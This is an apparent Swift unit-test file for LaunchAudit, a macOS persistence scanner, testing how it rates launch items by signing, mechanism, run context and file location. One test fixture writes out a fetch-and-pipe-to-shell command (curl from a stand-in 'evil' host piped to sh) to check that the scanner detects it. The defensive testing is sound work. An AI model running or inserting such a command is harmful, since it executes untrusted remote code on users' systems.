import XCTest
@testable import LaunchAudit

final class RiskAnalyzerTests: XCTestCase {

    let analyzer = RiskAnalyzer()

    // MARK: - Signing Trust

    func testAppleSignedItemIsInformational() {
        var item = makeItem(category: .launchDaemons, configPath: "/System/Library/LaunchDaemons/test.plist")
        item.signingInfo = SigningInfo(
            isSigned: true,
            isAppleSigned: true,
            isNotarized: true,
            teamIdentifier: nil,
            signingAuthority: ["Apple Root CA"]
        )
        let result = analyzer.analyze(item)
        XCTAssertEqual(result.riskLevel, .informational)
    }

    func testAppleSignedOutsideSystemIsLow() {
        var item = makeItem(category: .launchDaemons, configPath: "/Library/LaunchDaemons/com.apple.test.plist")
        item.signingInfo = SigningInfo(
            isSigned: true,
            isAppleSigned: true,
            isNotarized: true
        )
        let result = analyzer.analyze(item)
        XCTAssertEqual(result.riskLevel, .low)
    }

    func testNotarizedItemIsCappedAtLow() {
        var item = makeItem(
            category: .launchDaemons,
            executablePath: "/Library/LaunchDaemons/com.example.daemon"
        )
        item.signingInfo = SigningInfo(
            isSigned: true,
            isNotarized: true,
            teamIdentifier: "TEAM123"
        )
        let result = analyzer.analyze(item)
        XCTAssertEqual(result.riskLevel, .low,
            "Notarized items should generally have a low risk rating")
    }

    func testSignedNotNotarizedIsMedium() {
        var item = makeItem(category: .launchAgents, executablePath: "/usr/local/bin/test")
        item.signingInfo = SigningInfo(
            isSigned: true,
            isNotarized: false,
            teamIdentifier: "TEAM456"
        )
        let result = analyzer.analyze(item)
        XCTAssertGreaterThanOrEqual(result.riskLevel, .medium)
        XCTAssert(result.riskReasons.contains { $0.contains("not notarized") })
    }

    func testAdHocSignedIsHigh() {
        var item = makeItem(category: .launchAgents, executablePath: "/usr/local/bin/test")
        item.signingInfo = SigningInfo(
            isSigned: false,
            isAdHocSigned: true
        )
        let result = analyzer.analyze(item)
        XCTAssertGreaterThanOrEqual(result.riskLevel, .high)
        XCTAssert(result.riskReasons.contains { $0.contains("Ad-hoc") })
    }

    func testUnsignedItemIsHigh() {
        var item = makeItem(category: .launchAgents, executablePath: "/usr/local/bin/test")
        item.signingInfo = .unsigned
        let result = analyzer.analyze(item)
        XCTAssertGreaterThanOrEqual(result.riskLevel, .high)
        XCTAssert(result.riskReasons.contains { $0.contains("Unsigned") })
    }

    // MARK: - Mechanism Severity

    func testDylibInjectionIsCritical() {
        let item = makeItem(category: .dylibInjection, riskLevel: .medium)
        let result = analyzer.analyze(item)
        XCTAssertEqual(result.riskLevel, .critical)
    }

    func testDeprecatedMechanismEscalates() {
        let item = makeItem(category: .loginHooks, riskLevel: .medium)
        let result = analyzer.analyze(item)
        XCTAssertGreaterThanOrEqual(result.riskLevel, .high)
        XCTAssert(result.riskReasons.contains { $0.contains("deprecated") })
    }

    func testLaunchDaemonMechanismIsHigh() {
        // A real launch daemon always references an executable, so signature state
        // is always part of the picture. Here it cannot be verified, which is
        // genuine evidence and keeps the mechanism's severity in play.
        let item = makeItem(
            category: .launchDaemons,
            configPath: "/Library/LaunchDaemons/com.example.plist",
            executablePath: "/usr/local/bin/example"
        )
        let result = analyzer.analyze(item)
        XCTAssertGreaterThanOrEqual(result.riskLevel, .high)
        XCTAssert(result.riskReasons.contains { $0.contains("root") })
    }

    /// Mechanism severity alone must not produce a High verdict.
    ///
    /// Every stock `/etc/pam.d` file and every Apple kernel extension used to be
    /// High purely for belonging to a powerful category, which buried the handful
    /// that were genuinely notable.
    func testPowerfulMechanismWithNoEvidenceIsNotHigh() {
        let item = makeItem(category: .pamModules)
        let result = analyzer.analyze(item)
        XCTAssertLessThan(result.riskLevel, .high,
                          "a clean item must not be High just for its category")
    }

    /// …but categories that macOS never creates are exempt: finding one at all is
    /// the evidence.
    func testObsoleteMechanismIsStillHighWithNoOtherEvidence() {
        for category in [PersistenceCategory.rcScripts, .startupItems, .loginHooks] {
            let result = analyzer.analyze(makeItem(category: category))
            XCTAssertGreaterThanOrEqual(
                result.riskLevel, .high,
                "\(category) should stand on its own"
            )
        }
    }

    func testLoginItemMechanismIsLow() {
        let item = makeItem(category: .loginItems)
        let result = analyzer.analyze(item)
        // loginItems mechanism is low, no signing → no signing penalty
        // (no executable path, so signing dimension is informational)
        XCTAssertLessThanOrEqual(result.riskLevel, .low)
    }

    func testReopenAtLoginIsLow() {
        let item = makeItem(category: .reopenAtLogin)
        let result = analyzer.analyze(item)
        XCTAssertLessThanOrEqual(result.riskLevel, .low)
    }

    func testInputManagersIsCritical() {
        let item = PersistenceItem(
            category: .inputMethods,
            name: "EvilInputManager",
            rawMetadata: ["Deprecated": .bool(true)]
        )
        let result = analyzer.analyze(item)
        XCTAssertEqual(result.riskLevel, .critical)
        XCTAssert(result.riskReasons.contains { $0.contains("InputManagers") })
    }

    // MARK: - Execution Context

    func testNonNotarizedRootBootIsHigh() {
        var item = makeItem(
            category: .launchDaemons,
            executablePath: "/Library/LaunchDaemons/com.example.daemon"
        )
        item.signingInfo = SigningInfo(
            isSigned: true,
            isNotarized: false,
            teamIdentifier: "TEAM789"
        )
        // Recreate with boot context and system owner (mimics a real daemon)
        let daemonItem = PersistenceItem(
            category: .launchDaemons,
            name: "com.example.daemon",
            executablePath: "/Library/LaunchDaemons/com.example.daemon",
            runContext: .boot,
            owner: .system,
            signingInfo: item.signingInfo
        )
        let result = analyzer.analyze(daemonItem)
        XCTAssertGreaterThanOrEqual(result.riskLevel, .high,
            "Non-notarized root items running at startup should be high risk")
        XCTAssert(result.riskReasons.contains { $0.contains("Non-notarized") && $0.contains("root") })
    }

    func testNotarizedRootBootIsCappedLow() {
        let item = PersistenceItem(
            category: .launchDaemons,
            name: "com.example.daemon",
            executablePath: "/Library/LaunchDaemons/com.example.daemon",
            runContext: .boot,
            owner: .system,
            signingInfo: SigningInfo(
                isSigned: true,
                isNotarized: true,
                teamIdentifier: "TEAM123"
            )
        )
        let result = analyzer.analyze(item)
        XCTAssertEqual(result.riskLevel, .low,
            "Notarized root boot items should be capped at low")
    }

    // MARK: - Location

    func testWorldWritablePathIsCritical() {
        var item = makeItem(category: .cronJobs, executablePath: "/tmp/evil.sh")
        item.signingInfo = .unsigned
        let result = analyzer.analyze(item)
        XCTAssertEqual(result.riskLevel, .critical)
        XCTAssert(result.riskReasons.contains { $0.contains("world-writable") })
    }

    func testWorldWritableBypassesNotarizationCap() {
        var item = makeItem(category: .cronJobs, executablePath: "/tmp/suspicious")
        item.signingInfo = SigningInfo(
            isSigned: true,
            isNotarized: true,
            teamIdentifier: "TEAM000"
        )
        let result = analyzer.analyze(item)
        XCTAssertEqual(result.riskLevel, .critical,
            "World-writable location should override notarization trust capping")
    }

    func testDylibInjectionBypassesNotarizationCap() {
        var item = makeItem(category: .dylibInjection)
        item.signingInfo = SigningInfo(
            isSigned: true,
            isNotarized: true,
            teamIdentifier: "TEAM000"
        )
        let result = analyzer.analyze(item)
        XCTAssertEqual(result.riskLevel, .critical,
            "DYLD injection should override notarization trust capping")
    }

    // MARK: - Script-Based Categories

    func testShellProfileNotPenalizedForUnsigned() {
        // Use /etc/profile (non-hidden) to test signing exemption in isolation —
        // hidden dot-files like .zshrc correctly trigger location escalation separately.
        let item = PersistenceItem(
            category: .shellProfiles,
            name: "profile",
            configPath: "/etc/profile",
            executablePath: "/etc/profile",
            runContext: .login,
            owner: .system,
            signingInfo: .unsigned  // scripts can't be signed
        )
        let result = analyzer.analyze(item)
        // Shell profiles shouldn't be penalized for being unsigned (they're text files)
        // Mechanism severity is medium; signing should be informational for script categories
        XCTAssertLessThanOrEqual(result.riskLevel, .medium)
        XCTAssertFalse(result.riskReasons.contains { $0.contains("Unsigned") },
            "Script-based items should not be flagged as unsigned binaries")
    }

    func testShellProfileWithSuspiciousPatternsStaysHigh() {
        let item = PersistenceItem(
            category: .shellProfiles,
            name: ".zshrc",
            configPath: "/Users/testuser/.zshrc",
            executablePath: "/Users/testuser/.zshrc",
            runContext: .login,
            owner: .user("testuser"),
            signingInfo: .unsigned,
            riskLevel: .high,
            riskReasons: ["Downloads and pipes to bash"]
        )
        let result = analyzer.analyze(item)
        XCTAssertGreaterThanOrEqual(result.riskLevel, .high,
            "Scanner-flagged suspicious shell profiles should remain high risk")
    }

    // MARK: - Scanner-Set Risk Integration

    func testScannerRiskReasonsPreserved() {
        let item = PersistenceItem(
            category: .pamModules,
            name: "pam_evil.so",
            executablePath: "/usr/local/lib/pam/pam_evil.so",
            riskLevel: .high,
            riskReasons: ["Non-standard PAM module binary"]
        )
        let result = analyzer.analyze(item)
        XCTAssertGreaterThanOrEqual(result.riskLevel, .high)
        XCTAssert(result.riskReasons.contains { $0.contains("Non-standard PAM") })
    }

    func testDefaultMediumRiskDoesNotInflate() {
        // Items with default .medium riskLevel but no explicit riskReasons
        // should not be inflated by the scanner's default
        let item = PersistenceItem(
            category: .reopenAtLogin,
            name: "Calculator",
            riskLevel: .medium  // default from scanner, no reasons
        )
        let result = analyzer.analyze(item)
        XCTAssertLessThanOrEqual(result.riskLevel, .low,
            "Default scanner risk without reasons should not inflate the final level")
    }

    // MARK: - Source Attribution (unchanged behavior)

    func testAppleSignedSourceIsApple() {
        var item = makeItem(category: .launchDaemons)
        item.signingInfo = SigningInfo(
            isSigned: true,
            isAppleSigned: true,
            isNotarized: true
        )
        let result = analyzer.analyze(item)
        XCTAssertEqual(result.source, .apple)
    }

    func testThirdPartySignedSourceExtractsDeveloper() {
        var item = makeItem(category: .launchAgents)
        item.signingInfo = SigningInfo(
            isSigned: true,
            isNotarized: true,
            teamIdentifier: "TEAM123",
            signingAuthority: ["Developer ID Application: Example Corp (TEAM123)"]
        )
        let result = analyzer.analyze(item)
        if case .thirdParty(let name) = result.source {
            XCTAssertEqual(name, "Example Corp")
        } else {
            XCTFail("Expected thirdParty source with developer name")
        }
    }

    // MARK: - Helpers

    private func makeItem(
        category: PersistenceCategory,
        configPath: String? = nil,
        executablePath: String? = nil,
        riskLevel: RiskLevel = .medium
    ) -> PersistenceItem {
        PersistenceItem(
            category: category,
            name: "Test Item",
            configPath: configPath,
            executablePath: executablePath,
            riskLevel: riskLevel
        )
    }
}

// MARK: - RiskClassifier Unit Tests

final class RiskClassifierTests: XCTestCase {

    let classifier = RiskClassifier()

    // MARK: - Signing Trust Dimension

    func testSigningTrust_appleSigned() {
        let signing = SigningInfo(isSigned: true, isAppleSigned: true, isNotarized: true)
        let (level, _, _) = classifier.classifySigningTrust(signing, hasExecutable: true, category: .launchDaemons)
        XCTAssertEqual(level, .informational)
    }

    func testSigningTrust_notarized() {
        let signing = SigningInfo(isSigned: true, isNotarized: true, teamIdentifier: "TEAM")
        let (level, reasons, mitigations) = classifier.classifySigningTrust(
            signing, hasExecutable: true, category: .launchAgents
        )
        XCTAssertEqual(level, .low)
        // A known team identity argues the item is benign, so it belongs in
        // mitigations. Listing it under `reasons` put a reassuring fact in the
        // warning list, next to a risk badge.
        XCTAssertTrue(reasons.isEmpty, "notarized code has nothing to warn about")
        XCTAssert(mitigations.contains { $0.contains("TEAM") })
        XCTAssert(mitigations.contains { $0.contains("Notarized") })
    }

    func testSigningTrust_signedNotNotarized() {
        let signing = SigningInfo(isSigned: true, isNotarized: false, teamIdentifier: "TEAM")
        let (level, reasons, _) = classifier.classifySigningTrust(signing, hasExecutable: true, category: .launchAgents)
        XCTAssertEqual(level, .medium)
        XCTAssert(reasons.contains { $0.contains("not notarized") })
    }

    func testSigningTrust_unsigned() {
        let (level, reasons, _) = classifier.classifySigningTrust(.unsigned, hasExecutable: true, category: .launchAgents)
        XCTAssertEqual(level, .high)
        XCTAssert(reasons.contains { $0.contains("Unsigned") })
    }

    func testSigningTrust_noExecutable() {
        let (level, _, _) = classifier.classifySigningTrust(nil, hasExecutable: false, category: .launchAgents)
        XCTAssertEqual(level, .informational)
    }

    func testSigningTrust_scriptCategory_unsignedIsInformational() {
        let (level, reasons, _) = classifier.classifySigningTrust(.unsigned, hasExecutable: true, category: .shellProfiles)
        XCTAssertEqual(level, .informational)
        XCTAssertFalse(reasons.contains { $0.contains("Unsigned") })
    }

    func testSigningTrust_scriptCategory_nilIsInformational() {
        let (level, _, _) = classifier.classifySigningTrust(nil, hasExecutable: true, category: .periodicTasks)
        XCTAssertEqual(level, .informational)
    }

    // MARK: - Mechanism Severity Dimension

    func testMechanism_dylibIsCritical() {
        let (level, _) = classifier.classifyMechanismSeverity(.dylibInjection)
        XCTAssertEqual(level, .critical)
    }

    func testMechanism_launchDaemonsIsHigh() {
        let (level, _) = classifier.classifyMechanismSeverity(.launchDaemons)
        XCTAssertEqual(level, .high)
    }

    func testMechanism_kernelExtensionsIsHigh() {
        let (level, _) = classifier.classifyMechanismSeverity(.kernelExtensions)
        XCTAssertEqual(level, .high)
    }

    func testMechanism_pamModulesIsHigh() {
        let (level, _) = classifier.classifyMechanismSeverity(.pamModules)
        XCTAssertEqual(level, .high)
    }

    func testMechanism_launchAgentsIsMedium() {
        let (level, _) = classifier.classifyMechanismSeverity(.launchAgents)
        XCTAssertEqual(level, .medium)
    }

    func testMechanism_loginItemsIsLow() {
        let (level, _) = classifier.classifyMechanismSeverity(.loginItems)
        XCTAssertEqual(level, .low)
    }

    func testMechanism_spotlightIsInformational() {
        let (level, _) = classifier.classifyMechanismSeverity(.spotlightImporters)
        XCTAssertEqual(level, .informational)
    }

    func testMechanism_loginHooksEscalated() {
        let (level, reasons) = classifier.classifyMechanismSeverity(.loginHooks)
        XCTAssertEqual(level, .high)
        XCTAssert(reasons.contains { $0.contains("deprecated") })
    }

    func testMechanism_startupItemsEscalated() {
        let (level, _) = classifier.classifyMechanismSeverity(.startupItems)
        XCTAssertEqual(level, .high)
    }

    // MARK: - Execution Context Dimension

    func testContext_rootBootNonNotarized() {
        let (level, reasons) = classifier.classifyExecutionContext(
            runContext: .boot, owner: .system, signing: SigningInfo(isSigned: true)
        )
        XCTAssertEqual(level, .high)
        XCTAssert(reasons.contains { $0.contains("Non-notarized") })
    }

    func testContext_rootBootNotarized() {
        let signing = SigningInfo(isSigned: true, isNotarized: true)
        let (level, _) = classifier.classifyExecutionContext(
            runContext: .boot, owner: .system, signing: signing
        )
        XCTAssertEqual(level, .medium)
    }

    func testContext_rootBootApple() {
        let signing = SigningInfo(isSigned: true, isAppleSigned: true, isNotarized: true)
        let (level, _) = classifier.classifyExecutionContext(
            runContext: .boot, owner: .system, signing: signing
        )
        XCTAssertEqual(level, .informational)
    }

    func testContext_userLogin() {
        let (level, _) = classifier.classifyExecutionContext(
            runContext: .login, owner: .user("test"), signing: nil
        )
        XCTAssertEqual(level, .low)
    }

    func testContext_onDemand() {
        let (level, _) = classifier.classifyExecutionContext(
            runContext: .onDemand, owner: .system, signing: nil
        )
        XCTAssertEqual(level, .informational)
    }

    func testContext_alwaysRunningRootNonNotarized() {
        let (level, reasons) = classifier.classifyExecutionContext(
            runContext: .always, owner: .system, signing: SigningInfo(isSigned: true)
        )
        XCTAssertEqual(level, .high)
        XCTAssert(reasons.contains { $0.contains("always-running") })
    }

    // MARK: - Content Signals Dimension

    func testContent_inputManagerDeprecated() {
        let (level, reasons) = classifier.classifyContentSignals(
            category: .inputMethods,
            rawMetadata: ["Deprecated": .bool(true)]
        )
        XCTAssertEqual(level, .critical)
        XCTAssert(reasons.contains { $0.contains("InputManagers") })
    }

    func testContent_normalInputMethod() {
        let (level, _) = classifier.classifyContentSignals(
            category: .inputMethods,
            rawMetadata: [:]
        )
        XCTAssertEqual(level, .informational)
    }

    // MARK: - Full Classification Integration

    func testClassify_notarizedDaemonIsCappedLow() {
        let item = PersistenceItem(
            category: .launchDaemons,
            name: "com.example.daemon",
            executablePath: "/Library/LaunchDaemons/com.example.daemon",
            runContext: .boot,
            owner: .system,
            signingInfo: SigningInfo(isSigned: true, isNotarized: true, teamIdentifier: "TEAM")
        )
        let assessment = classifier.classify(item)
        XCTAssertEqual(assessment.level, .low)
        XCTAssertTrue(
            assessment.mitigations.contains { $0.contains("Notarized") },
            "notarization is a mitigating factor, not a warning"
        )
    }

    func testClassify_unsignedDaemonIsHighOrAbove() {
        let item = PersistenceItem(
            category: .launchDaemons,
            name: "com.suspicious.daemon",
            executablePath: "/Library/LaunchDaemons/com.suspicious.daemon",
            runContext: .boot,
            owner: .system,
            signingInfo: .unsigned
        )
        let assessment = classifier.classify(item)
        XCTAssertGreaterThanOrEqual(assessment.level, .high)
    }

    func testClassify_notarizedLoginItemIsLow() {
        let item = PersistenceItem(
            category: .loginItems,
            name: "MyApp",
            executablePath: "/Applications/MyApp.app/Contents/MacOS/MyApp",
            runContext: .login,
            owner: .user("test"),
            signingInfo: SigningInfo(isSigned: true, isNotarized: true, teamIdentifier: "TEAM")
        )
        let assessment = classifier.classify(item)
        XCTAssertEqual(assessment.level, .low)
    }

    func testClassify_allDimensions_reasonsCollected() {
        let item = PersistenceItem(
            category: .launchDaemons,
            name: "Test",
            executablePath: "/Library/LaunchDaemons/test",
            runContext: .boot,
            owner: .system,
            signingInfo: SigningInfo(isSigned: true, isNotarized: false, teamIdentifier: "TEAM"),
            riskLevel: .medium,
            riskReasons: ["Scanner-detected issue"]
        )
        let reasons = classifier.classify(item).reasons
        // Should contain reasons from signing, mechanism, context, and scanner
        XCTAssert(reasons.contains { $0.contains("not notarized") })
        XCTAssert(reasons.contains { $0.contains("root") })
        XCTAssert(reasons.contains { $0.contains("Non-notarized") })
        XCTAssert(reasons.contains { $0.contains("Scanner-detected") })
    }

    // MARK: - Regressions from the audit

    /// The interpreter-masking hole: an Apple-signed `/bin/sh` running an
    /// attacker's inline command must not be capped down to Low/Informational by
    /// trust capping.
    func testClassify_interpreterFrontedItemIsNotCappedByAppleTrust() {
        let item = PersistenceItem(
            category: .launchAgents,
            name: "com.evil.updater",
            configPath: "/System/Library/LaunchAgents/com.evil.updater.plist",
            executablePath: "/bin/sh",
            arguments: ["/bin/sh", "-c", "curl http://evil/x | sh"],
            runContext: .login,
            owner: .user("test"),
            signingInfo: SigningInfo(isSigned: true, isAppleSigned: true)
        )

        let assessment = classifier.classify(item)
        XCTAssertGreaterThanOrEqual(
            assessment.level, .high,
            "a shell-fronted payload must not inherit the interpreter's Apple trust"
        )
        XCTAssertTrue(assessment.reasons.contains { $0.contains("Downloads and executes") })
    }

    /// Ad-hoc signing is a classic malware indicator. It used to be unreachable:
    /// the `isSigned && !isNotarized` branch matched first and reported it as a mild
    /// "signed but not notarized".
    func testClassify_adHocSigningIsReportedAsSuch() {
        let (level, reasons, _) = classifier.classifySigningTrust(
            SigningInfo(isSigned: true, isAdHocSigned: true),
            hasExecutable: true,
            category: .launchDaemons
        )
        XCTAssertEqual(level, .high)
        XCTAssertTrue(reasons.contains { $0.lowercased().contains("ad-hoc") },
                      "expected an ad-hoc reason, got \(reasons)")
    }

    /// Entitlements must be able to defeat notarization capping — a notarized binary
    /// with library validation disabled is a legitimate injection target.
    func testClassify_riskyEntitlementsSurviveNotarizationCapping() {
        let item = PersistenceItem(
            category: .launchDaemons,
            name: "com.example.injectable",
            configPath: "/Library/LaunchDaemons/com.example.injectable.plist",
            executablePath: "/usr/local/bin/injectable",
            runContext: .boot,
            owner: .system,
            signingInfo: SigningInfo(
                isSigned: true,
                isNotarized: true,
                teamIdentifier: "TEAM",
                entitlements: ["com.apple.security.cs.disable-library-validation"]
            )
        )
        let assessment = classifier.classify(item)
        XCTAssertGreaterThan(assessment.level, .low,
                             "library validation disabled must not be capped to Low")
        XCTAssertTrue(assessment.reasons.contains { $0.contains("Library validation") })
    }

    /// A disabled item is a finding worth keeping but not an active threat.
    func testClassify_disabledItemIsDemotedAndExplained() {
        func makeItem(enabled: Bool) -> PersistenceItem {
            PersistenceItem(
                category: .kernelExtensions,
                name: "ShadowDriver",
                configPath: "/Library/Extensions/ShadowDriver.kext",
                executablePath: "/Library/Extensions/ShadowDriver.kext/Contents/MacOS/ShadowDriver",
                isEnabled: enabled,
                runContext: .boot,
                owner: .system,
                signingInfo: .unsigned
            )
        }

        let enabled = classifier.classify(makeItem(enabled: true))
        let disabled = classifier.classify(makeItem(enabled: false))

        XCTAssertLessThan(disabled.level, enabled.level,
                          "a disabled kext should not score the same as a live one")
        XCTAssertTrue(disabled.mitigations.contains { $0.contains("disabled") })
    }

    /// Shell profiles are dotfiles by definition, so "hidden config file" is noise
    /// that was previously appended to every single one.
    func testClassify_shellProfileDoesNotGetHiddenFileReason() {
        let (_, reasons) = classifier.classifyLocation(
            configPath: "/Users/test/.zshrc",
            executablePath: nil,
            arguments: [],
            category: .shellProfiles
        )
        XCTAssertFalse(reasons.contains { $0.contains("Hidden config file") },
                       "got noise reasons: \(reasons)")
    }

    /// A dotfile in an unexpected category still deserves the flag.
    func testClassify_hiddenConfigStillFlaggedForOtherCategories() {
        let (_, reasons) = classifier.classifyLocation(
            configPath: "/Library/LaunchDaemons/.hidden.plist",
            executablePath: nil,
            arguments: [],
            category: .launchDaemons
        )
        XCTAssertTrue(reasons.contains { $0.contains("Hidden config file") })
    }

    /// An argument pointing into a world-writable directory is a finding even when
    /// the executable itself looks fine.
    func testClassify_worldWritableArgumentIsCritical() {
        let (level, reasons) = classifier.classifyLocation(
            configPath: "/Library/LaunchDaemons/x.plist",
            executablePath: "/usr/bin/true",
            arguments: ["/usr/bin/true", "/tmp/payload.sh"],
            category: .launchDaemons
        )
        XCTAssertEqual(level, .critical)
        XCTAssertTrue(reasons.contains { $0.contains("world-writable") })
    }

    /// Apple's own daemon, registered by a SIP-protected plist, passing Apple's
    /// chosen data directory as an argument. Modeled on `com.apple.kdumpd`, which
    /// scored High for `/var/tmp/PanicDumps` and so ignored "Hide Apple items".
    func testClassify_worldWritableArgumentInSealedPlistIsCapped() {
        let item = PersistenceItem(
            category: .launchDaemons,
            name: "com.apple.kdumpd",
            configPath: "/System/Library/LaunchDaemons/com.apple.kdumpd.plist",
            executablePath: "/bin/ls",
            arguments: ["/bin/ls", "/var/tmp/PanicDumps"],
            isEnabled: false,
            signingInfo: SigningInfo(isSigned: true, isAppleSigned: true),
            source: .apple,
            rawMetadata: ["UserName": .string("nobody")]
        )
        let assessment = classifier.classify(item)
        XCTAssertEqual(assessment.level, .informational)
        XCTAssertTrue(item.isVerifiedAppleSoftware)
        XCTAssertFalse(assessment.reasons.contains { $0.contains("as root") },
                       "daemon runs as nobody: \(assessment.reasons)")
        XCTAssertTrue(assessment.reasons.contains { $0.contains("\u{201C}nobody\u{201D}") })
    }

    /// The same argument from a third-party plist is still a hard override, even
    /// though the binary it runs is Apple's.
    func testClassify_worldWritableArgumentInThirdPartyPlistStaysCritical() {
        let item = PersistenceItem(
            category: .launchDaemons,
            name: "com.example.updater",
            configPath: "/Library/LaunchDaemons/com.example.updater.plist",
            executablePath: "/bin/ls",
            arguments: ["/bin/ls", "/tmp/payload"],
            signingInfo: SigningInfo(isSigned: true, isAppleSigned: true)
        )
        XCTAssertEqual(classifier.classify(item).level, .critical)
    }

    /// A codeless bundle (only an Info.plist, like `AppleMobileDevice.kext`) is
    /// verified as a bundle, and an Apple signature that seals its own
    /// configuration counts as Apple's wherever the bundle is installed.
    func testCodelessAppleBundleOutsideSealedVolumeIsApple() throws {
        let bundle = NSTemporaryDirectory() + "LaunchAuditTests-\(UUID().uuidString)/Driver.kext"
        try FileManager.default.createDirectory(
            atPath: bundle + "/Contents/_CodeSignature", withIntermediateDirectories: true
        )
        try Data().write(to: URL(fileURLWithPath: bundle + "/Contents/Info.plist"))
        defer { try? FileManager.default.removeItem(atPath: (bundle as NSString).deletingLastPathComponent) }

        let item = PersistenceItem(
            category: .kernelExtensions,
            name: "Driver",
            configPath: bundle,
            runContext: .boot,
            signingInfo: SigningInfo(isSigned: true, isAppleSigned: true),
            source: .apple
        )
        XCTAssertEqual(item.signatureTargetPath, bundle)
        XCTAssertTrue(item.isConfigCoveredBySignature)
        XCTAssertTrue(item.isVerifiedAppleSoftware)
        XCTAssertEqual(classifier.classify(item).level, .informational)
    }

    /// A loose plist pointing at an Apple binary is still someone else's
    /// persistence: the signature does not cover the plist.
    func testLoosePlistPointingAtAppleBinaryIsNotApple() {
        let item = PersistenceItem(
            category: .launchDaemons,
            name: "com.example.helper",
            configPath: "/Library/LaunchDaemons/com.example.helper.plist",
            executablePath: "/bin/ls",
            signingInfo: SigningInfo(isSigned: true, isAppleSigned: true)
        )
        XCTAssertFalse(item.isConfigCoveredBySignature)
        XCTAssertFalse(item.isVerifiedAppleSoftware)
    }

    /// A plain directory is not code; it must not be "verified" and then
    /// reported as unsigned.
    func testPlainDirectoryIsNotASignatureTarget() throws {
        let dir = NSTemporaryDirectory() + "LaunchAuditTests-\(UUID().uuidString)/app.savedState"
        try FileManager.default.createDirectory(atPath: dir, withIntermediateDirectories: true)
        defer { try? FileManager.default.removeItem(atPath: (dir as NSString).deletingLastPathComponent) }

        let item = PersistenceItem(category: .reopenAtLogin, name: "app", configPath: dir)
        XCTAssertNil(item.signatureTargetPath)
    }

    /// Root ignores permission bits, so "can this process write it" is yes for
    /// everything under `sudo`. Writability findings must ask whether a non-root
    /// account could write the file. Every flagged file in the privileged-scan
    /// report (`/etc/zshrc`, `/etc/pam.d/*`, `/usr/libexec/cups/backend/usb`) is
    /// `root:wheel` and not group- or world-writable.
    func testRootOwnedSystemFilesAreNotWritableByNonRoot() {
        XCTAssertFalse(PathUtilities.modeAllowsNonRootWrite(mode: 0o444, owner: 0, group: 0))
        XCTAssertFalse(PathUtilities.modeAllowsNonRootWrite(mode: 0o644, owner: 0, group: 0))
        XCTAssertFalse(PathUtilities.modeAllowsNonRootWrite(mode: 0o664, owner: 0, group: 0),
                       "group wheel is root-equivalent")
        XCTAssertFalse(PathUtilities.modeAllowsNonRootWrite(mode: 0o555, owner: 0, group: 0))
    }

    func testNonRootWritableModesAreDetected() {
        XCTAssertTrue(PathUtilities.modeAllowsNonRootWrite(mode: 0o646, owner: 0, group: 0),
                      "world-writable")
        XCTAssertTrue(PathUtilities.modeAllowsNonRootWrite(mode: 0o664, owner: 0, group: 80),
                      "group-writable by admin")
        XCTAssertTrue(PathUtilities.modeAllowsNonRootWrite(mode: 0o644, owner: 501, group: 20),
                      "owned by a user")
        XCTAssertFalse(PathUtilities.modeAllowsNonRootWrite(mode: 0o444, owner: 501, group: 20),
                       "owned by a user but read-only to them too")
    }

    /// A document bundle such as an Automator workflow has an Info.plist but no
    /// signature; it is not code to verify.
    func testUnsignedDocumentBundleIsNotASignatureTarget() throws {
        let bundle = NSTemporaryDirectory() + "LaunchAuditTests-\(UUID().uuidString)/Run.workflow"
        try FileManager.default.createDirectory(
            atPath: bundle + "/Contents", withIntermediateDirectories: true
        )
        try Data().write(to: URL(fileURLWithPath: bundle + "/Contents/Info.plist"))
        defer { try? FileManager.default.removeItem(atPath: (bundle as NSString).deletingLastPathComponent) }

        let item = PersistenceItem(category: .automatorWorkflows, name: "Run", configPath: bundle)
        XCTAssertNil(item.signatureTargetPath)
    }
}
